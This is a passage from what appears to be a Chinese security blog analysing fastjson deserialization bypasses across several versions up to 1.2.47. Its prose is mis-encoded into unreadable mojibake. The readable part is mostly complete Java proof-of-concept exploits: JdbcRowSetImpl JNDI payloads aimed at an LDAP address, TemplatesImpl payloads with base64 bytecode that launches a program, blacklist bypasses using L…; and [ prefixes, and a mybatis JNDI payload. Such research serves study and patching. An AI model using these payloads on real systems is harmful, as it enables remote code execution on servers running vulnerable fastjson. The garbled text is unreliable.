äº†çš„é»‘åå•ï¼š\nå…·ä½“çš„é»‘åå•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework æŠŠcom.sunåŒ…ä¸‹çš„ç±»éƒ½ç¦äº†ï¼Œå¯¼è‡´å‰é¢çš„ä¸¤æ¡é“¾å­éƒ½æ‰“ä¸äº†äº†ã€‚\nè¿™é‡Œå†æ¥ç®€å•çœ‹ä¸€ä¸‹è°ƒç”¨é“¾è¿‡ç¨‹ï¼Œè¿˜æ˜¯ç”¨å‰é¢çš„æ‰“jndiæ³¨å…¥çš„åœ°æ–¹æ¥è°ƒè¯•ï¼Œä¸»è¦çš„ä¸åŒåœ¨äºå¦‚ä¸‹ä»£ç ï¼š\nåŸæœ¬æˆ‘ä»¬æ˜¯ç›´æ¥è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½ç±»ï¼Œè¿™é‡ŒåŠ äº†ä¸€ä¸ªæ£€æµ‹ï¼Œè·Ÿè¿›è¿™é‡Œçš„checkAutoType()æ–¹æ³•ï¼š\nè°ƒç”¨æ ˆä¸ºï¼š\n1 2 3 4 5 6 7 8 checkAutoType:844, ParserConfig (com.alibaba.fastjson.parser) parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, Fastjson_Test (fastjson) å†çœ‹ä¸Šå›¾ï¼ŒautoTypeSupporté»˜è®¤æ˜¯falseï¼Œè¿™é‡Œå¦‚æœæƒ³è¦è°ƒç”¨åˆ°loadClass()æ–¹æ³•ï¼Œé™¤äº†ä¸åŒ¹é…åˆ°é»‘åå•ï¼Œè¿˜éœ€è¦åŒ¹é…åˆ°ç™½åå•ï¼Œä½†æ˜¯è¿™é‡Œçš„ç™½åå•åˆæ˜¯ç©ºï¼š å¦‚æœä¸è¿›è¡Œå¤„ç†çš„è¯å°±ä¸å¯èƒ½å¯ä»¥è°ƒç”¨åˆ°loadClass()æ–¹æ³•ã€‚ä½†æ˜¯åœ¨è¿™ä¸ªæ–¹æ³•çš„å¤„ç†ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªåœ°æ–¹éƒ½æœ‰è°ƒç”¨TypeUtils.loadClass()ï¼Œé™¤äº†ä¸Šé¢è¿™ä¸ªï¼Œé¡ºåºåˆ†åˆ«ä¸ºï¼š\nä»¥åŠï¼š\nåœ¨æœ€åä¸€ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è°ƒç”¨éƒ½æ˜¯å’ŒautoTypeSupportå˜é‡ç›¸å…³çš„ï¼Œè¿™é‡Œçš„expectClasså˜é‡æ˜¯å½¢å‚ä¼ é€’çš„ï¼Œè‚¯å®šä¸ºnullï¼Œé‚£ä¹ˆè¿™é‡Œåªè¦å¯ä»¥å°è¯•æ§åˆ¶autoTypeSupportä¸ºtrueï¼Œå¹¶ä¸”ä¸è§¦å‘é»‘åå•ï¼Œç™½åå•ä¸ç”¨ç®¡ï¼Œåæ­£ç™½åå•æ˜¯ä¸ä¼šè§¦å‘çš„ï¼Œæœ¬æ¥å°±æ˜¯ä¸€ä¸ªç©ºçš„ã€‚é‚£ä¹ˆå°±å¯ä»¥å°è¯•åœ¨è¿™é‡Œè¿›è¡Œä¸€æ¬¡åŠ è½½ç±»ã€‚\né»‘åå•æ€ä¹ˆè§£å†³ï¼Œå½“æ—¶å¯ä»¥å°è¯•ä½¿ç”¨é»‘åå•ä¹‹å¤–çš„ç±»ï¼Œè¿˜æœ‰å¦å¤–çš„è§£æ³•ï¼Œè·Ÿè¿›TypeUtils.loadClass()æ–¹æ³•ï¼Œæœ‰ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼š\næœ€å¼€å§‹æˆ‘ä»¬æ˜¯ç›´æ¥è¿›è¡Œæœ€ä¸‹é¢æ–¹æ³•çš„è°ƒç”¨ï¼Œç„¶åç›´æ¥è¿”å›åŠ è½½çš„ç±»ï¼Œç°åœ¨çœ‹æˆ‘ä»¬è¿™é‡Œæ ‡æ³¨å‡ºæ¥çš„ä¸¤ä¸ªä»£ç å—ï¼š\nå¯¹äºç¬¬ä¸€ä¸ªï¼Œå¦‚æœä»¥[å¼€å¤´ï¼Œå°±æ˜¯@typeé”®çš„å€¼ä»¥[å¼€å¤´ï¼Œå°±ä½¿ç”¨substringæ–¹æ³•æ¥æˆªæ–­è·å–[åé¢çš„æ–¹æ³•ï¼Œç„¶åå†æ¬¡è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½ï¼Œä½†æ˜¯ä¼šä¹‹ç±»æœ€åæ˜¯æ”¾è¿›äº†ä¸€ä¸ªæ•°ç»„ï¼Œåé¢è¿˜éœ€è¦è¿›è¡Œå¤„ç†ã€‚\nå¯¹äºç¬¬äºŒä¸ªï¼Œå¦‚æœå¯¹åº”å€¼ä»¥Lå¼€å¤´å¹¶ä¸”ä»¥;ç»“å°¾ï¼Œé‚£ä¹ˆåŒæ ·æˆªå–ä¸­é—´çš„å†…å®¹ï¼Œç„¶åå†æ¬¡è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒå¥½ç”¨äº†ï¼Œæ˜¯ç›´æ¥è¿”å›çš„loadClass()å¤„ç†å®Œçš„æ•°æ®ï¼Œä¸ç”¨åœ¨åé¢çš„ä»£ç è¿›è¡Œå¤„ç†ã€‚\nè¿™é‡Œæˆ‘ä»¬å…ˆä»¥ç¬¬äºŒä¸ªä¸ºä¾‹æ¥å®Œæˆä¸€æ¬¡è°ƒç”¨ï¼Œå†æ¥åˆ†ææ„é€ ç¬¬ä¸€ä¸ªçš„payloadã€‚åœ¨å‰é¢çš„äº†è§£ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ç¦»ä¸å¼€çš„å˜é‡å°±æ˜¯autoTypeSupportï¼Œæˆ‘ä»¬éœ€è¦ä»–ä¸ºfalseï¼Œè·Ÿè¿›è¿™ä¸ªå˜é‡çš„èµ‹å€¼ï¼š\nå†çœ‹AUTO_SUPPORTå˜é‡çš„èµ‹å€¼ï¼Œé»˜è®¤æƒ…å†µä¸‹å°±æ˜¯å¦‚ä¸‹ä»£ç ï¼š\nçŸ¥é“è¿™é‡Œæœ€åä¸ºfalseå³å¯ï¼Œæ€ä¹ˆè®¾ç½®è¿™ä¸ªç±»çš„autoTypeSupportå˜é‡ï¼Œåœ¨è¿™ä¸ªç±»å…¶å®æ˜¯å­˜åœ¨ä¸€ä¸ªsetteræ–¹æ³•çš„ï¼Œç”¨äºç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼š\nä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥åœ¨jsonæ•°æ®å­—ç¬¦ä¸²ä¸­èµ‹å€¼ï¼Œå› ä¸ºè¿™ä¸ªç±»ä¹Ÿæ˜¯ç›´æ¥ä»å½¢å‚ä¸Šå®šä¹‰çš„ï¼Œç®€å•æº¯æºå¦‚ä¸‹ï¼š\nè°ƒç”¨çš„configå˜é‡çš„è¿™ä¸ªæ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯ParserConfigç±»çš„checkAutoType()æ–¹æ³•ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥çŸ¥é“æ˜¯DefaultJSONParserè¿™ä¸ªç±»çš„configå˜é‡ï¼Œä¹Ÿæ˜¯è°ƒè¯•åˆ†ææ—¶ç»å¸¸å‡ºç°çš„ï¼Œæº¯åˆ°DefaultJSONParserç±»çš„å®ä¾‹åŒ–ï¼š\nå¯¹åº”å†…å®¹ä¸ºï¼š\nå½¢å‚ä¼ é€’å°±ä¸å¤šè¯´äº†ï¼Œè·Ÿä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œæ‰€ä»¥configçš„èµ‹å€¼å°±æ˜¯è¿™ä¸ªï¼Œä»ä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œå°±æ˜¯å®ä¾‹åŒ–äº†ä¸€ä¸ªParserConfigç±»ï¼Œå˜é‡éƒ½æ˜¯é»˜è®¤çš„ï¼Œæ‰€ä»¥åœ¨jsonå­—ç¬¦ä¸²å¯¹æ˜¯ä¸å¯æ§çš„ï¼Œæ‰€ä»¥å…¶å®æœ‰ä¸€å®šçš„å±€é™æ€§çš„ï¼Œæœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nå¯¹åº”çš„TemplatesImplå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\\\u0026#34;,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } é‚£ä¹ˆå¯¹äºæ•°ç»„çš„å½¢å¼ï¼ŒJdbcRowSetImplçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nTemplatesImplå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } ç„¶åè°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹å³å¯ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nå±€é™æ€§è¿˜æ˜¯æŒºå¤§çš„ï¼Œè¿˜éœ€è¦â€œæ‰‹åŠ¨â€å°†autoTypeSupportè®¾ç½®ä¸ºtrueã€‚\n1.2.42 xmlä¾èµ–çš„ç‰ˆæœ¬æ”¹æˆ1.2.42å³å¯ã€‚è¿™ä¸ªç‰ˆæœ¬ä¸‹ï¼Œæ•°ç»„çš„payloadè¿˜æ˜¯å¯ä»¥æ‰“ã€‚\nç”¨å‰é¢çš„JdbcRowSetImplé“¾æ¥çœ‹ä¸€ä¸‹ä¸»è¦çš„ä¸åŒç‚¹ï¼Œè¿˜æ˜¯è·Ÿè¿›è¿™é‡Œçš„checkAutoType()æ–¹æ³•ï¼š\nè¿™é‡Œéƒ½æ˜¯ä½¿ç”¨å“ˆå¸Œæ¥è®¡ç®—çš„ï¼Œè¿™é‡Œå¤§æ¦‚æ„æ€å°±æ˜¯çœ‹ç±»åå‰åæ˜¯å¦ä»¥Lå¼€å¤´ï¼Œä»¥;ç»“å°¾ï¼Œæ˜¯çš„è¯å°±ä½¿ç”¨substring()æ–¹æ³•æ¥è¿›è¡Œæˆªå–ï¼Œç„¶åå†è¿›è¡Œåç»­çš„è°ƒç”¨ï¼Œç„¶åè¿™é‡Œçš„åˆ¤æ–­æ˜¯ç”¨çš„hashCodeï¼š\næ²¡æœ‰ä½¿ç”¨ä¹‹å‰çš„å­—æ¯çš„åå•ï¼ŒåŒæ—¶è¿™é‡Œæ˜¯è‚¯å®šä¼šè¢«banæ‰çš„ï¼Œç»è¿‡å¤„ç†åè‚¯å®šä¼šè¢«åŒ¹é…åˆ°é»‘åå•ä»è€Œæ‰”å‡ºå¼‚å¸¸ï¼Œç»•è¿‡æ–¹æ³•å°±æ˜¯å†åŠ ä¸€å±‚ï¼Œå› ä¸ºè¿™é‡ŒåªåŒ¹é…ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯åªæˆªå–ä¸€æ¬¡ï¼Œè€Œä¸”TypeUtils.loadClass()æ–¹æ³•å¹¶æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;LLcom.sun.rowset.JdbcRowSetImpl;;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } æ•°ç»„æ ¼å¼æ²¡æœ‰å½±å“ï¼Œç›´æ¥æ‰“å°±è¡Œäº†ï¼Œåªæœ‰Læ ¼å¼çš„ä½¿ç”¨åŒå†™ç»•è¿‡å³å¯ã€‚\nç®€å•è¯´è¯´è¿™é‡Œçš„Lè¿‡ç¨‹ï¼Œå‰é¢è¿›è¡Œé»‘åå•çš„åˆ¤æ–­ï¼Œä¹Ÿæ˜¯å’Œå‰é¢åˆ†æçš„å·®ä¸å¤šçš„ï¼Œå°±æ˜¯ä¸å˜é‡autoTypeSupportä¸ºtrueæˆ–è€…falseï¼Œéƒ½ä¼šè¿›è¡Œä¸€æ¬¡ï¼Œä½†æ˜¯éƒ½ä¸åœ¨ç™½åå•ä¸­ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥åŠ è½½ï¼Œæœ€åè¿˜æ˜¯åœ¨å¦‚ä¸‹è¿›è¡ŒåŠ è½½çš„ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ä¼ å…¥çš„å½¢å‚ä¼ é€’çš„å†…å®¹ï¼Œç„¶ååˆ¤æ–­æ˜¯æœ‰clazzæ˜¯å¦ä¸ºnullï¼Œè¿™é‡Œçœ‹ä¼¼å¯ä»¥ä¸ç”¨å†è°ƒç”¨ParserConfig.getGlobalInstance().setAutoTypeSupport(true)æ¥è¿›è¡Œè®¾ç½®å€¼ï¼Œå‰é¢æˆ‘ä»¬ä¹ŸçŸ¥é“ï¼Œè¿™é‡Œçš„autoTypeSupporté»˜è®¤ä¸ºfalseï¼Œåçœ‹æœ‰ä¸€ä¸ªé€»è¾‘æˆ‘ä»¬å¿…é¡»è®©è¿™ä¸ªå˜é‡ä¸ºtrueï¼š\nåªæœ‰ä½trueæ‰èƒ½æ­£å¸¸è·å–åˆ°æƒ³è¦çš„ç±»ï¼Œä¸ç„¶å°±ä¼šæŠ¥å¼‚å¸¸ä»è€Œé€€å‡ºã€‚\nç„¶åå¯¹äºTypeUtils.loadClass()æ–¹æ³•å†…çš„å†…å®¹ï¼š å¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¼šè°ƒç”¨ä¸‰æ¬¡è¿™ä¸ªloadClass()æ–¹æ³•æœ€åæ‰ä¼šæˆåŠŸåŠ è½½åˆ°ç±»ï¼š\nåé¢å°±æ˜¯ç†ŸçŸ¥çš„è¿‡ç¨‹äº†ï¼Œè¿™ä¸å¤šè¯´ã€‚\n1.2.43 ä¾èµ–æ”¹ç‰ˆæœ¬ï¼Œç„¶åç›´æ¥å®šä½åˆ°ä¿®æ”¹çš„éƒ¨åˆ†ï¼Œè¿˜æ˜¯è·Ÿè¿›checkAutoType()æ–¹æ³•ï¼š é‡Œé¢åˆå¥—äº†ä¸€ä¸ªifæ¡ä»¶ï¼Œæ„æ€å°±æ˜¯å¦‚æœæ˜¯ä»¥LLå¼€å¤´ï¼Œé‚£ä¹ˆå°±ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚\nè¿™é‡Œçš„ç»•è¿‡æ–¹æ³•å°±æ˜¯å‰é¢çš„æ•°ç»„ï¼Œæ²¡é”™ï¼Œåˆ°è¿™ä¸ªç‰ˆæœ¬çš„æ•°ç»„æ ¼å¼è¿˜æ˜¯èƒ½æ‰“ï¼Œæœ€åçš„payloadå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } TemplatesImplå°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;[{,\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;fupanc\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;yv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAY=\\\u0026#34;],\\\u0026#34;_class\\\u0026#34;:null,\\\u0026#34;_tfactory\\\u0026#34;:{},\\\u0026#34;_outputProperties\\\u0026#34;:{}}\u0026#34;; JSONObject obj = JSON.parseObject(json, Feature.SupportNonPublicField); } } â€”â€”â€”â€”â€”â€”\n1.2.44 åŒæ ·æ˜¯åœ¨checkAutoType()æ–¹æ³•ä¸­ï¼Œå¦‚ä¸‹é€»è¾‘ï¼š\nå‰ä¸€ä¸ªifæ˜¯åˆ¤æ–­æ˜¯å¦ä»¥[å¼€å¤´ï¼Œç¬¬äºŒä¸ªåº”è¯¥æ˜¯åˆ¤æ–­æœ€åæ˜¯å¦ä»¥;ç»“å°¾å§ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹å‡ºå°±æ˜¯ä¿®å¤äº†[çš„payloadï¼Œè¿‡æ»¤äº†æ•°ç»„å½¢å¼çš„payloadã€‚\n1.2.45 è¿™ä¸ªç‰ˆæœ¬è¿˜å­˜åœ¨ä¸€ä¸ªé»‘åå•ç»•è¿‡ï¼Œä½†æ˜¯å…¶å®æ˜¯ä¸€ä¸ªç»„ä»¶æ¼æ´ï¼Œè¿™é‡Œåˆ©ç”¨åˆ°çš„æ˜¯mybatisç»„å»ºï¼Œéœ€è¦æ·»åŠ ä¾èµ–ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æ³¨æ„ä¿®æ”¹fastjsonçš„ç‰ˆæœ¬ã€‚\nå…¶å®è¿™ä¸ªæ¼æ´åŸºæœ¬çœ‹ä¸€ä¸‹payloadå°±æ‡‚äº†ï¼Œåˆ©ç”¨äº†ç»„ä»¶ï¼Œæ‰€ä»¥ç®—æ˜¯åˆ©ç”¨å¦å¤–çš„ç±»ï¼Œåœ¨1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45ç‰ˆæœ¬åªè¦æœ‰è¿™ä¸ªç»„ä»¶éƒ½èƒ½æ‰“ã€‚\nPOCå¦‚ä¸‹ï¼š\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;,\u0026#34;properties\u0026#34;:{\u0026#34;data_source\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;}} å¯¹åº”ç±»çš„setteræ–¹æ³•æœ‰jndiæ¼æ´ï¼š\næ‰€ä»¥æ„é€ äº†ç›´æ¥æ‰“å°±è¡Œäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 package fastjson; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.ParserConfig; public class Fastjson_Test{ public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String json = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\u0026#34;,\\\u0026#34;properties\\\u0026#34;:{\\\u0026#34;data_source\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:2333/fupanc\\\u0026#34;}}\u0026#34;; JSONObject obj = JSON.parseObject(json); } } è¿è¡Œå¼¹å‡ºè®¡ç®—æœºï¼Œæ³¨æ„è¿˜æ˜¯éœ€è¦è®¾ç½®autoTypeSupportä¸ºtrueã€‚\n1.2.47 è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒé‡è¦çš„æ¼æ´ç‚¹äº†ï¼Œå¯ä»¥ä¸å¼€å§‹autoTypeSupportè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚\nå½±å“ç‰ˆæœ¬ï¼š1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.47\nè¿™é‡Œè¿˜æ˜¯ä»1.2.47ç‰ˆæœ¬æ¥åˆ†æã€‚\nè¿˜æ˜¯è·Ÿè¿›checkAutoType()æ–¹æ³•ï¼Œå…¶å®åœ¨è¿™ä¸ªç±»ä¸æ­¢æœ€åé‚£ä¸ªéœ€è¦autoTypeSupportä¸ºtrueæ‰èƒ½è¿”å›åŠ è½½åˆ°çš„clazzï¼Œå¦‚ä¸‹ä»£ç ï¼š\nè¿™é‡Œçš„expectClasså˜é‡é»˜è®¤ä¸ºnullï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬èƒ½åœ¨TypeUtils.getClassFromMapping()æˆ–è€…deserializers.findClass()æ‰¾åˆ°æƒ³è¦åˆ©ç”¨çš„ç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œè¿”å›åŠ è½½åˆ°çš„ç±»ã€‚\nè·Ÿè¿›è¿™é‡Œçš„TypeUtils.getClassFromMapping()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯ä»mappingä¸­å–å€¼ï¼Œé‚£ä¹ˆè¿™ä¸ªmappingsæ˜¯æ€ä¹ˆè¿›è¡Œå¤„ç†çš„å‘¢ï¼Œé‡æ–°è·Ÿäº†ä¸€éæµç¨‹ï¼Œæ²¡çœ‹åˆ°æœ‰èµ‹å€¼çš„åœ°æ–¹ï¼Œé‚£ä¹ˆè‚¯å®šå°±æ˜¯TypeUtilsç±»çš„staticè¯­å¥åœ¨è¿›è¡Œå¤„ç†ï¼Œç¿»çœ‹äº†ä¸€ä¸‹è¿™ä¸ªç±»çš„staticè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ï¼š è·Ÿè¿›è¿™ä¸ªaddBaseClassMappings()æ–¹æ³•ï¼Œé‡Œé¢åŠ 